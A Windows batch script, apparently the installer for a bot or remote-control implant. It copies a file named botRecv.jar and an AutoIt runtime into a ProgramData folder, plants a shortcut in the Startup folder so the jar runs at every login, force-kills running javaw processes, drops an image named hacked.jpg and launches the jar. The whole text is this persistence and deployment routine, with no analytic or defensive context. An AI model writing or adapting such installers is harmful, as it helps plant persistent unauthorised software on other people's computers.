SET recieveDir=C:\ProgramData\recieve
FOR /F "delims=" %%i IN ('cscript /nologo "%~dp0\get-startup.vbs"') DO SET usedStartupFolder=%%i

mkdir "%recieveDir%"

echo D | xcopy "%~dp0\AutoIt3" "%recieveDir%\AutoIt3" /s/h/e/k/f/c 1>nul
cscript /nologo "%~dp0\link.vbs" "%recieveDir%\Autoit3.lnk" "%recieveDir%\AutoIt3\AutoIt3.exe"

copy "%~dp0\botRecv.jar" "%recieveDir%\program.jar"
cscript /nologo "%~dp0\link.vbs" "%usedStartupFolder%\program.lnk" "%recieveDir%\program.jar" "%recieveDir%"

taskkill.exe /F /IM javaw.exe

copy "%~dp0\hacked.jpg" "%recieveDir%\hacked.jpg"

start "" "%usedStartupFolder%\program.lnk"
start "" "%usedStartupFolder%\program.jar"